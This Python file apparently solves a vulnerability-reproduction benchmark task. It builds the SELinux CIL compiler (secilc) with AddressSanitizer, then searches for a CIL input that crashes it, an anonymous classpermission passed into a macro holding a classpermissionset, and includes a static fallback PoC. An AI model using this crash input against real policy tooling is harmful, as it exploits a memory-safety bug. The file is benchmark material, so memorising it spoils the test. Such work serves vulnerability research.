import os
import tarfile
import tempfile
import subprocess
import re
from typing import List, Optional, Tuple, Dict


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            return self._solve_impl(src_path)
        except Exception:
            return self._static_poc()

    # ---------------- Core Implementation ----------------

    def _solve_impl(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp(prefix="poc_gen_")
        self._extract_tar(src_path, work_dir)
        root_dir = self._detect_root_dir(work_dir)

        cil_files = self._collect_cil_files(root_dir)
        if not cil_files:
            return self._static_poc()

        cp_def, cp_set, call_has_paren_args, sample_cil_path = self._collect_cil_components(
            cil_files
        )

        # If we can't find essential components, fall back
        if cp_def is None or cp_set is None:
            return self._static_poc()

        # Build project with ASAN and find secilc-like CLI
        cli_path, search_root = self._build_with_asan_and_find_cli(root_dir)
        if cli_path is None:
            # Can't build or can't find CLI, fall back to unvalidated PoC
            poc_text = self._construct_poc_text_without_validation(
                cp_def, cp_set, call_has_paren_args
            )
            return poc_text.encode("utf-8", errors="ignore")

        # Infer how to invoke CLI using a known-valid CIL file
        sample_for_cli = sample_cil_path if sample_cil_path is not None else cil_files[0]
        cli_pattern = self._infer_cli_invocation(cli_path, sample_for_cli)
        if cli_pattern is None:
            poc_text = self._construct_poc_text_without_validation(
                cp_def, cp_set, call_has_paren_args
            )
            return poc_text.encode("utf-8", errors="ignore")

        # Dynamic search for PoC that triggers ASAN
        poc_text = self._dynamic_search_poc(
            cli_path,
            cli_pattern,
            cp_def,
            cp_set,
            call_has_paren_args,
            search_root,
        )
        if poc_text is None:
            poc_text = self._construct_poc_text_without_validation(
                cp_def, cp_set, call_has_paren_args
            )

        return poc_text.encode("utf-8", errors="ignore")

    # ---------------- Tar / Root Helpers ----------------

    def _extract_tar(self, src_path: str, dest_dir: str) -> None:
        with tarfile.open(src_path, "r:*") as tar:
            tar.extractall(dest_dir)

    def _detect_root_dir(self, work_dir: str) -> str:
        entries = [
            os.path.join(work_dir, d)
            for d in os.listdir(work_dir)
            if os.path.isdir(os.path.join(work_dir, d))
        ]
        if len(entries) == 1:
            return entries[0]
        return work_dir

    # ---------------- CIL Parsing Helpers ----------------

    def _collect_cil_files(self, root_dir: str) -> List[str]:
        cil_files: List[str] = []
        for r, _, files in os.walk(root_dir):
            for f in files:
                if f.endswith(".cil"):
                    cil_files.append(os.path.join(r, f))
        return cil_files

    def _extract_paren_expr(self, text: str, start_idx: int) -> Tuple[str, int]:
        depth = 0
        n = len(text)
        for i in range(start_idx, n):
            ch = text[i]
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    return text[start_idx : i + 1], i
        # If we get here, the expression was not balanced; just return until end
        return text[start_idx:], n - 1

    def _parse_classpermission_defs(
        self, text: str, file_path: str
    ) -> List[Dict[str, str]]:
        res: List[Dict[str, str]] = []
        pattern = "(classpermission"
        idx = 0
        while True:
            pos = text.find(pattern, idx)
            if pos == -1:
                break
            expr, end = self._extract_paren_expr(text, pos)
            cp_info = self._parse_single_classpermission(expr, file_path)
            if cp_info is not None:
                res.append(cp_info)
            idx = end + 1
        return res

    def _parse_single_classpermission(
        self, expr: str, file_path: str
    ) -> Optional[Dict[str, str]]:
        # expr like: "(classpermission NAME (file (read write)))"
        prefix = "(classpermission"
        if not expr.startswith(prefix):
            return None
        inner = expr[len(prefix) :].strip()
        # remove final ')'
        if inner.endswith(")"):
            inner_body = inner[:-1].rstrip()
        else:
            inner_body = inner
        # skip leading whitespace
        i = 0
        n = len(inner_body)
        while i < n and inner_body[i].isspace():
            i += 1
        if i >= n:
            return None
        # if next char is '(' then it's anonymous
        if inner_body[i] == "(":
            name = None
            body = inner_body[i:].strip()
        else:
            # parse name token
            start = i
            while i < n and not inner_body[i].isspace() and inner_body[i] not in "()":
                i += 1
            name = inner_body[start:i]
            body = inner_body[i:].strip()
        return {
            "text": expr,
            "name": name,
            "body": body,
            "file": file_path,
        }

    def _parse_classpermissionset_defs(
        self, text: str, file_path: str
    ) -> List[Dict[str, str]]:
        res: List[Dict[str, str]] = []
        pattern = "(classpermissionset"
        idx = 0
        while True:
            pos = text.find(pattern, idx)
            if pos == -1:
                break
            expr, end = self._extract_paren_expr(text, pos)
            res.append({"text": expr, "file": file_path})
            idx = end + 1
        return res

    def _parse_call_exprs(
        self, text: str, file_path: str
    ) -> List[Dict[str, object]]:
        res: List[Dict[str, object]] = []
        pattern = "(call"
        idx = 0
        while True:
            pos = text.find(pattern, idx)
            if pos == -1:
                break
            expr, end = self._extract_paren_expr(text, pos)
            info = self._parse_single_call_expr(expr, file_path)
            if info is not None:
                res.append(info)
            idx = end + 1
        return res

    def _parse_single_call_expr(
        self, expr: str, file_path: str
    ) -> Optional[Dict[str, object]]:
        # expr like: "(call macro_name (args))" or "(call macro_name arg1 arg2)"
        if not expr.startswith("(") or not expr.endswith(")"):
            return None
        inner = expr[1:-1].strip()
        if not inner.startswith("call"):
            return None
        rest = inner[4:].lstrip()
        if not rest:
            return None
        # skip macro name
        i = 0
        n = len(rest)
        while i < n and not rest[i].isspace() and rest[i] not in "()":
            i += 1
        args_str = rest[i:].lstrip()
        has_paren_args = args_str.startswith("(")
        return {
            "text": expr,
            "file": file_path,
            "has_paren_args": has_paren_args,
        }

    def _collect_cil_components(
        self, cil_files: List[str]
    ) -> Tuple[Optional[Dict[str, str]], Optional[Dict[str, str]], bool, Optional[str]]:
        cp_defs: List[Dict[str, str]] = []
        cp_sets: List[Dict[str, str]] = []
        call_exprs: List[Dict[str, object]] = []

        for path in cil_files:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except Exception:
                continue

            cp_defs.extend(self._parse_classpermission_defs(text, path))
            cp_sets.extend(self._parse_classpermissionset_defs(text, path))
            call_exprs.extend(self._parse_call_exprs(text, path))

        # Select classpermission with name
        named_cp_defs = [d for d in cp_defs if d.get("name")]
        cp_def_sel: Optional[Dict[str, str]] = None
        cp_set_sel: Optional[Dict[str, str]] = None

        if named_cp_defs and cp_sets:
            for cp in named_cp_defs:
                name = cp["name"]
                # search cp_set referencing this name, prefer same file
                best: Optional[Dict[str, str]] = None
                pattern = re.compile(r"\b" + re.escape(name) + r"\b")
                for cps in cp_sets:
                    if not pattern.search(cps["text"]):
                        continue
                    if cps["file"] == cp["file"]:
                        best = cps
                        break
                    if best is None:
                        best = cps
                if best is not None:
                    cp_def_sel = cp
                    cp_set_sel = best
                    break

        # Determine call expr sample
        if call_exprs:
            sample_call = call_exprs[0]
            call_has_paren_args = bool(sample_call.get("has_paren_args"))
            sample_cil_path = sample_call.get("file")
        else:
            # default assumption: args are parenthesized
            call_has_paren_args = True
            sample_cil_path = cp_def_sel["file"] if cp_def_sel is not None else None

        return cp_def_sel, cp_set_sel, call_has_paren_args, sample_cil_path  # type: ignore[return-value]

    # ---------------- Build & CLI Helpers ----------------

    def _build_with_asan_and_find_cli(
        self, root_dir: str
    ) -> Tuple[Optional[str], Optional[str]]:
        env = os.environ.copy()
        san_flags = "-g -O1 -fsanitize=address"
        env["CFLAGS"] = san_flags + " " + env.get("CFLAGS", "")
        env["LDFLAGS"] = "-fsanitize=address " + env.get("LDFLAGS", "")

        search_root = root_dir
        try:
            if os.path.exists(os.path.join(root_dir, "configure")):
                self._run_quiet(
                    ["./configure"],
                    cwd=root_dir,
                    env=env,
                )
                self._run_quiet(
                    ["make", "-j", "8"],
                    cwd=root_dir,
                    env=env,
                )
            elif os.path.exists(os.path.join(root_dir, "CMakeLists.txt")):
                build_dir = os.path.join(root_dir, "build")
                os.makedirs(build_dir, exist_ok=True)
                cmake_cmd = [
                    "cmake",
                    "-DCMAKE_BUILD_TYPE=Debug",
                    f"-DCMAKE_C_FLAGS={san_flags}",
                    "..",
                ]
                self._run_quiet(cmake_cmd, cwd=build_dir, env=env)
                self._run_quiet(
                    ["cmake", "--build", ".", "-j", "8"],
                    cwd=build_dir,
                    env=env,
                )
                search_root = build_dir
            else:
                return None, None
        except Exception:
            return None, None

        # search for secilc / cil-like binary
        best: Optional[str] = None
        for r, _, files in os.walk(search_root):
            for f in files:
                if f in ("secilc", "cil", "cilc", "cil_compiler"):
                    path = os.path.join(r, f)
                    if os.path.isfile(path) and os.access(path, os.X_OK):
                        if f == "secilc":
                            return path, search_root
                        if best is None:
                            best = path
        return best, search_root

    def _run_quiet(
        self,
        cmd: List[str],
        cwd: Optional[str] = None,
        env: Optional[dict] = None,
    ) -> None:
        subprocess.run(
            cmd,
            cwd=cwd,
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True,
        )

    def _infer_cli_invocation(
        self, cli_path: str, sample_cil: str
    ) -> Optional[List[str]]:
        patterns = [
            [],  # secilc sample.cil
            ["-o", os.devnull],
            ["-f", "cil"],
            ["-f", "cil", "-o", os.devnull],
            ["-o", os.devnull, "-f", "cil"],
        ]
        for pat in patterns:
            cmd = [cli_path] + pat + [sample_cil]
            try:
                p = subprocess.run(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=15,
                )
            except Exception:
                continue
            if p.returncode == 0:
                return pat
        # If none returned 0, still return simplest pattern, maybe non-zero from warnings
        return patterns[0] if patterns else None

    # ---------------- Dynamic POC Search ----------------

    def _dynamic_search_poc(
        self,
        cli_path: str,
        cli_pattern: List[str],
        cp_def: Dict[str, str],
        cp_set: Dict[str, str],
        call_has_paren_args: bool,
        work_root: str,
    ) -> Optional[str]:
        # Prepare anonymous classpermission variants
        cp_body = cp_def.get("body", "").strip()
        cp_named_expr = cp_def.get("text", "").strip()
        anon_variants: List[str] = []
        if cp_body:
            anon_variants.append("(classpermission " + cp_body + ")")
        if cp_named_expr:
            # crude anonymous form: remove name token if present
            prefix = "(classpermission"
            inner = cp_named_expr[len(prefix) :].strip()
            if inner:
                # drop first token if it's not '('
                i = 0
                n = len(inner)
                while i < n and inner[i].isspace():
                    i += 1
                if i < n and inner[i] != "(":
                    # skip token
                    while i < n and not inner[i].isspace() and inner[i] not in "()":
                        i += 1
                body2 = inner[i:].strip()
                if body2:
                    anon_expr2 = "(classpermission " + body2
                    if not anon_expr2.endswith(")"):
                        anon_expr2 += ")"
                    anon_variants.append(anon_expr2)

        if not anon_variants:
            return None

        # Prepare modified classpermissionset text using param 'p'
        cp_name = cp_def.get("name")
        cp_set_text = cp_set.get("text", "").strip()
        if not cp_name or not cp_set_text:
            return None

        pattern = re.compile(r"\b" + re.escape(cp_name) + r"\b")
        cp_set_modified = pattern.sub("p", cp_set_text, count=1)

        # Build macro text variants (macro at top-level)
        macro_text = (
            "(macro poc_macro\n"
            "  ((p classpermission))\n"
            "  " + cp_set_modified + "\n"
            ")\n"
        )

        call_variants: List[str] = []
        # We'll generate variants based on whether sample call used parentheses around args
        for anon in anon_variants:
            if call_has_paren_args:
                call_variants.append("(call poc_macro (" + anon + "))")
                call_variants.append("(call poc_macro " + anon + ")")
            else:
                call_variants.append("(call poc_macro " + anon + ")")
                call_variants.append("(call poc_macro (" + anon + "))")

        # Remove duplicates while preserving order
        seen_calls = set()
        uniq_call_variants: List[str] = []
        for c in call_variants:
            if c not in seen_calls:
                seen_calls.add(c)
                uniq_call_variants.append(c)

        # Try combinations and look for ASAN crash
        tmp_dir = tempfile.mkdtemp(prefix="cil_poc_", dir=work_root)
        for anon in anon_variants:
            for call_text in uniq_call_variants:
                poc_text = (
                    cp_named_expr
                    + "\n\n"
                    + macro_text
                    + "\n"
                    + call_text
                    + "\n"
                )
                if self._check_for_asan_crash(
                    cli_path, cli_pattern, poc_text, tmp_dir
                ):
                    return poc_text

        return None

    def _check_for_asan_crash(
        self,
        cli_path: str,
        cli_pattern: List[str],
        poc_text: str,
        tmp_dir: str,
    ) -> bool:
        poc_path = os.path.join(tmp_dir, "poc.cil")
        try:
            with open(poc_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(poc_text)
        except Exception:
            return False

        cmd = [cli_path] + cli_pattern + [poc_path]
        try:
            p = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
            )
        except Exception:
            return False

        if p.returncode == 0:
            return False

        stderr = p.stderr.decode("utf-8", errors="ignore")
        stdout = p.stdout.decode("utf-8", errors="ignore")
        combined = stderr + "\n" + stdout
        return "ERROR: AddressSanitizer" in combined

    # ---------------- Fallback PoC Construction ----------------

    def _construct_poc_text_without_validation(
        self,
        cp_def: Dict[str, str],
        cp_set: Dict[str, str],
        call_has_paren_args: bool,
    ) -> str:
        # Best-effort construction mirroring dynamic path without ASAN or CLI
        cp_named_expr = cp_def.get("text", "").strip()
        cp_body = cp_def.get("body", "").strip()
        cp_name = cp_def.get("name", "cpanon")

        if cp_body:
            anon_expr = "(classpermission " + cp_body + ")"
        else:
            anon_expr = "(classpermission (file (read write)))"

        cp_set_text = cp_set.get("text", "").strip()
        if cp_set_text and cp_name:
            pattern = re.compile(r"\b" + re.escape(cp_name) + r"\b")
            cp_set_modified = pattern.sub("p", cp_set_text, count=1)
        else:
            cp_set_modified = "(classpermissionset poc_cpset (p))"

        macro_text = (
            "(macro poc_macro\n"
            "  ((p classpermission))\n"
            "  " + cp_set_modified + "\n"
            ")\n"
        )

        if call_has_paren_args:
            call_text = "(call poc_macro (" + anon_expr + "))"
        else:
            call_text = "(call poc_macro " + anon_expr + ")"

        parts = []
        if cp_named_expr:
            parts.append(cp_named_expr)
        parts.append("")
        parts.append(macro_text)
        parts.append("")
        parts.append(call_text)
        parts.append("")
        return "\n".join(parts)

    # ---------------- Static Fallback PoC ----------------

    def _static_poc(self) -> bytes:
        # Very small, hand-crafted CIL snippet following typical CIL syntax
        # This is a conservative fallback if dynamic generation fails.
        poc = """
(block poc_block
  (macro poc_macro
    ((p classpermission))
    (classpermissionset poc_cpset (p))
  )
  (call poc_macro
    ((classpermission (file (read write))))
  )
)
"""
        return poc.encode("utf-8", errors="ignore")